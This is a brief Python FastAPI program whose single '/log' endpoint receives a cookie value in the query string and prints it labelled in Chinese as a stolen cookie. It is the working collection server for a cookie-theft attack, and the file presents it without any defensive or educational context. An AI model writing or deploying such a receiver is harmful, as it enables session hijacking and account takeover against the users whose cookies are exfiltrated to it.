from fastapi import FastAPI

app=FastAPI()

@app.get("/log")
def log(cookie: str):
    print("被偷的 Cookie:", cookie)
    return{"status": "ok"}